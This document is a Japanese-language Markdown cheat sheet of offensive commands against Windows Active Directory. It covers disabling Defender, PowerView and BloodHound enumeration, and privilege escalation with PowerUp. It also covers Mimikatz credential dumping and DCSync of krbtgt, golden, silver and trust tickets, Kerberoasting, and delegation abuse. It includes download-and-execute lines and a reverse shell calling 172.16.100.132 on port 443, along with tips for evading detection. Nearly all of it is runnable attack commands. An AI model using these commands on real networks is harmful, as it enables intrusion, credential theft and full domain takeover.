# Windows Active Directory

## Essential
### PowerShellの起動
.ps1などの読み込みのため実行ポリシーを指定して起動する
```
> powershell -ep bypass
```
### AMSIバイパス
ペンテストで利用するようなps1は悪性判定されるためAMSIをバイパスする
```
*SNIP*
```
### IOAVProtectionの無効化
```
Set-MpPreference -DisableIOAVProtection $true
```
### RealtimeMonitoringの無効化
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Enumeration
### PowerView.ps1
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
#### DomainUser
```
Get-NetUser | select -ExpandProperty samaccountname
```
#### DomainUser(Preauth Not Required)
```
Get-NetUser -PreauthNotRequired | select userprincipalname
```
#### Service Account
```
Get-NetUser -SPN | select -ExpandProperty samaccountname
```
#### DomainComputer
```
Get-NetComputer | select -ExpandProperty dnshostname
```
#### Domain Admins
ドメイングループの詳細
```
Get-Netgroup -Name "Domain Admins"
```
ドメイン（アドミン）グループメンバーの列挙
```
Get-NetGroupMember -Name "Domain Admins"
```
#### Enterprise Admins
ルートドメイン内
```
Get-NetGroupMember -Name "Enterprise Admins"
```
子ドメイン内
```
Get-NetGroupMember -Name "Enterprise Admins" -Domain parentdomain.local
```
#### Shares
```
Find-DomainShare
```
旧バージョンのPowerViewでは、特徴的でないものを除外可能<br>
https://github.com/PowerShellMafia/PowerSploit/blob/v3.0.0/Recon/PowerView.ps1<br>
```
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC –Verbose
```
#### Group Policy Object Group
```
Get-NetGPOGroup -Verbose
```
#### Organizational Unit s
```
Get-NetOU | select distinguishedname
```
#### Group Policy Object s
```
Get-NetGPO | select displayname
```
#### ACL(ユーザグループ)
```
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -verbose
```
#### ACL(ドメインアドミングループ)
```
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -verbose
```
#### 特定ユーザの変更修正権限の列挙
```
Invoke-ACLScanner -ResolveGUIDs |  ?{$_.IdentityReferenceName -match "UserNameORGroupName"}
```
#### ドメインフォレスト関連
ドメインフォレスト列挙
```
Get-NetForestDomain
```
ドメインフォレストの信頼関係の列挙
```
Get-NetDomainTrust | ft
Get-NetForestDomain | Get-NetDomainTrust | ft
Get-NetDomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | ft
```
外部ドメインの信頼関係の列挙
```
Get-NetForestDomain -Forest externaldomain.local
Get-NetDomainTrust -Domain externaldomain.local | ft
```
#### ローカル管理者権限のある端末の列挙
```
Find-LocalAdminAccess -Verbose
```
端末間でPingが通らない環境だとうまく検出できない。<br>
19630行目～19638行目ぐらいのTest-Connectionをコメントアウトするとよい。
```
ForEach ($TargetComputer in $ComputerName) {
    #$Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
    #if ($Up) {
        # check if the current user has local admin access to this server
        $Access = Test-AdminAccess -ComputerName $TargetComputer
        if ($Access.IsAdmin) {
            $TargetComputer
        }
    #}
}
```
もしくは、upをTrueで定数定義することでコネクションテストを迂回可能。
```
Set-Variable -name up -Value True -Option constant
```
#### ドメインアドミンなどの管理者アカウントでログイン中の端末を探索し、現在のユーザでログオン可能か調査
```
Invoke-UserHunter -CheckAccess
```
### BloodHound
#### neo4jとBloodhound
neo4j上で動く。<br>
ActiveDirectlyのユーザやグループ、コンピュータ、権限などの関係を解析してグラフで可視化してくれる。<br>
Domain Adminsまでの道筋や、横展開できるコンピュータなどの検討用。<br>
neo4j(https://neo4j.com/download-center/#community)<br>
BloodHound(https://github.com/BloodHoundAD/BloodHound/releases)<br>
neo4jのインストール
```
neo4j.bat install-service
neo4j.bat start
```
インストール後は、http://localhost:7474 にアクセスして、パスワードの変更を行う。デフォルトユーザとパスワードは、「neo4j / neo4j」。<br>

#### SharpHound
SharpHound(https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)<br>
実行
```
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Verbose
Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
```
SharpHoundの結果は実行者の権限視点の結果のため、新しいユーザアカウントや権限を奪取するたびに実行して結果を更新することが望ましい。
### AppLocker
AppLockerのポリシー一覧列挙
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
### kerberos関連
チケットのチェック
```
klist
```

## LocalPrivilegeEscalation
### PowerUp.ps1
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
#### クオートで囲われてない登録サービス一覧
```
Get-UnquotedService
```
#### サービスの実行ファイルが変更可能な登録サービス一覧
```
Get-ModifiableServiceFile
```
#### 登録されているサービスの設定を変更可能な登録サービス一覧
```
Get-ModifiableService
```
#### サービスを悪用する権限昇格
```
Invoke-ServiceAbuse -Name 'hogeservice' -UserName 'hogedomain\fugauser'
```
hogeserviceが悪用されて、コマンド「net localgorup Administrators hogedomain\fugauser /add」が実行される。
#### 全部チェック
```
Invoke-AllChecks
```
```
Invoke-PrivescAudit
```
## LateralMovement
### PowerShell Remote
Find-PSRemotingLocalAdminAccess.ps1<br>
https://pastebin.com/szWajhfS<br>
ローカル管理者権限で利用可能なPSRemotingの探索
```
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```
リモートセッションの確立
```
Enter-PSSession -ComputerName hostname
```
リモートでps1をインポート(例：Mimikatz)
```
$sess = New-PSSession -ComputerName hostname
Enter-PSSession $sess
<AMSI Bypass> and <Exit>
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession $sess
Invoke-Mimikatz
```
リモートでコマンドを実行
```
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName hostname
```
リモートでMimikatzを実行
```
iex (iwr http://172.16.100.132/Invoke-Mimikatz.ps1 -UseBasicParsing)
$sess = New-PSSession -ComputerName hostname
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```
リモートからファイルをコピー
```
Copy-Item -ToSession $sess -Path C:\hoge\Rubeus.exe -Destination C:\Users\hoge\Downloads
```
### Reverse Shell
Invoke-PowerShellTcp.ps1<br>
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```
powershell.exe iex (iwr http://172.16.100.132/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.132 -Port 443
```
検知回避のため、関数名を変更する方がよい。<br>
<br>
powercat.ps1<br>
https://github.com/besimorhino/powercat/blob/master/powercat.ps1
```
powercat -l -v -p 443 -t 1000
```
ファイアーウォールなどのため、ポートは443を使うほうが成功する可能性が高い。

## Credential Access
### Mimikatz(PowerShell版)
#### Pass the Hash, Over-Pass the Hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:targetuser /domain:targetdomain.local /ntlm:targethash /run:powershell.exe"'
```
一般的な挙動として、接続時にホスト名を指定するとOver-Pass the Hashになり、IPアドレスを指定するとPass the Hashになる。
#### Pass the Ticket(Pass the Key)
```
Invoke-Mimikatz -Command '"kerberos::ptt C:\tmp\ticketpath.kirbi"'
```

#### その他コマンド
```
# ログオンパスワードの平文やNTLMハッシュのダンプ
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
# AES keysのダンプ
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
# Credential Vaultからダンプ
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
# Secretのダンプ
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
# ドメインコントローラー上でのすべてのハッシュ(NTDS.dit)
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
# ドメインコントローラーのローカルAdministrator
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
# DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:NetBIOSdomainname\krbtgt"'
```

## DomainPersistence
### Golden Ticket
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:targetdomain.local /sid:S-1-5-21-targetdomain-sid /krbtgt:krbtgthash /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
### Silver Ticket
HOSTサービス
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:targetdomain.local /sid:S-1-5-21-targetdomain-sid /target:targethost.targetdomain.local /service:HOST /rc4:targethost-computeraccounthash /user:Administrator /ptt"'
```
RPCSSサービス
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:targetdomain.local /sid:S-1-5-21-targetdomain-sid /target:targethost.targetdomain.local /service:RPCSS /rc4:targethost-computeraccounthash /user:Administrator /ptt"'
```
schtasksで遠隔でタスクを登録するにはHOSTサービスのチケットが、WMIで遠隔でコマンドを実行するにはHOSTサービスとRPCSSサービスのチケットが必要<br><br>
遠隔タスク登録、開始
```
# Example
schtasks /create /S hostname /SC Weekly /RU "NT Authority\SYSTEM" /TN "TaskName" /TR "Command"
# Reverse Shell
schtasks /create /S hostname /SC Weekly /RU "NT Authority\SYSTEM" /TN "TaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.132/PowerReverseEx.ps1''')'"
# タスク開始
schtasks /Run /S hostname /TN "TaskName"
```
遠隔WMIコマンド
```
Get-WmiObject -Class win32_operatingsystem -ComputerName hostname
```
### Skeleton Key
### DSRM(Directory Service Restore Mode)

## DomainPrivilegeEscalation
### Kerberoast Attack
TGSの悪用、SPNの設定されたアカウントのTGSから暗号化されたハッシュを抽出してオフラインクラックが可能<br>
(現代においては、Rubeusを使うほうが賢い、https://github.com/GhostPack/Rubeus)

Targeted Kerberoastの場合は、持ってるアクセス許可を悪用してSPNを設定
```
Set-DomainObject -Identity username -Set @{serviceprincipalname='ops/whatever132'}
```
TGSの要求とチケットの抽出
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "spn/hostname" 

Invoke-Mimikatz -Command '"kerberos::list /export"'
```
ハッシュの抽出(PowerView)
```
Invoke-Kerberoast | fl
```
辞書攻撃
```
hashcat -m 13100 -a 0 hash.txt PassDict.txt 
```
### ASREPRoast Attack
AS-REPの悪用、事前認証を必要しない設定にしたアカウントのAS-REPの一部からハッシュを抽出してオフラインクラックが可能<br>
https://github.com/HarmJ0y/ASREPRoast/blob/master/ASREPRoast.ps1<br>
(現代においては、Rubeusを使うほうが賢い、https://github.com/GhostPack/Rubeus)<br>

Targeted ASREPRpast(?)の場合は、持ってるアクセス許可を悪用して設定
```
Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
```
ハッシュの抽出
```
Get-ASREPHash -UserName username
```
辞書攻撃
```
hashcat -m 18200 -a 0 hash.txt PassDict.txt 
```
### Unconstrained Delegation
#### MimikatzとInvoke-UserHunter
PowerViewで、Unconstrainedなコンピュータを探索(PowerView)
```
Get-NetComputer -Unconstrained | select -ExpandProperty dnshostname
```
Unconstrainedなコンピュータに侵入後、Mimikatzでチケットを抽出
```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
AdministratorのTGTでPass the Ticketして権限昇格<br>
<br>
#### Rubeusとプリンターのバグ
RubeusをUnconstrainedなコンピュータにコピー<br>
Rubeusの実行
```
 .\Rubeus.exe monitor /interval:5 /nowrap
```
ドメイン内の別コンピュータでプリンターバグを悪用するEXEを実行(https://ruuand.github.io/MS_RPRN/)
```
.\MS-RPRN.exe \\hoge-dc.targetdomain.local \\targetunconstrainedsrv.targetdomain.local
```
RubeusでPass the Ticket
```
 .\Rubeus.exe ptt /ticket:<hoge-DC computer account Base64 encoded Ticket>
```
DCSyncでkrbtgtハッシュ取得
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:hoge\krbtgt"'
```
### Constrained Delegation
#### Use UserAccount
Constrained Delegationが有効なユーザアカウントの探索と対象サービスの確認(PowerView)
```
# userprincipalname, msds-allowedtodelegatetoの項目
Get-DomainUser -TrustedToAuth
```
##### kekeo版
kekeoでTGTを要求(https://github.com/gentilkiwi/kekeo/releases/)
```
.\kekeo.exe
tgt::ask /user:username /domain:targetdomain.local /rc4:NTLMHash
```
ファイルに保存される<br>
TGSの要求
```
tgs::s4u /tgt:ticket_filename.kirbi /user:Administrator@targetdomain.local /service:cifs_etc/targetsrv.targetdomain.LOCAL
```
ファイルに保存される<br>
MimikatzでPass the Ticket
##### Rubeus版
RubeusでTGTとTGSを要求し、Pass the Ticket
```
 .\Rubeus.exe s4u /user:username /rc4:NTLMHash /impersonateuser:Administrator /msdsspn:"CIFS_etc/targetsrv.targetdomain.LOCAL" /ptt

```
#### Use ComputerAccount
Constrained Delegationが有効なコンピュータアカウントの探索と対象サービスの確認(PowerView)
```
# userprincipalname, msds-allowedtodelegatetoの項目
Get-DomainComputer -TrustedToAuth
```
##### kekeo版
kekeoでTGTを要求(https://github.com/gentilkiwi/kekeo/releases/)
```
.\kekeo.exe
tgt::ask /user:computeraccountname$ /domain:targetdomain.local /rc4:NTLMHash
```
ファイルに保存される<br>
TGSの要求
```
tgs::s4u /tgt:ticket_filename.kirbi /user:Administrator@targetdomain.local /service:time/target-dc.targetdomain.LOCAL|ldap/target-dc.targetdomain.LOCAL
```
ファイルに保存される<br>
MimikatzでladpのTGSをPass the Ticket、DCSyncでkrbtgtのハッシュを取得
##### Rubeus版
RubeusでTGTとTGSを要求し、Pass the Ticket
```
 .\Rubeus.exe s4u /user:computeraccountname$ /rc4:NTLMHash /impersonateuser:Administrator /msdsspn:"time/target-dc.targetdomain.LOCAL" /altservice:ldap /ptt
```
## ForestAccess, ForestPersistence
### Forge Trust Referral Ticket
#### Preparation
ログオン中ドメインのSIDを取得
```
Get-DomainSID -Domain childdomain.parentdomain.local
```
Enterprise AdminsのSIDを取得
```
Get-DomainGroup "Enterprise Admins" -Domain parentdomain.local
```

#### Using Trust Key
Trust keyのHashを取得
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
#or
Invoke-Mimikatz -Command '"lsadump::dcsync /user:childdomain\parentdomain$"'
```
トラストチケットの作成
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:childdomain.parentdomain.local /sid:S-1-5-21-ログオン中ドメインのSID /sids:S-1-5-21-EnterpriseAdminsのSID-519 /rc4:TrustKeyのHash /service:krbtgt /target:parentdomain.local /ticket:trust_tkt.kirbi"'
```
#### Using krbtgt hash
ログオン中ドメインのkrbtgtアカウントのHashを取得
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:childdomain\krbtgt"'
```
トラストチケットの作成
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:childdomain.parentdomain.local /sid:S-1-5-21-ログオン中ドメインのSID /sids:S-1-5-21-EnterpriseAdminsのSID-519 /rc4:krbtgtのHash /ticket:krbtgt_tkt.kirbi"'
```
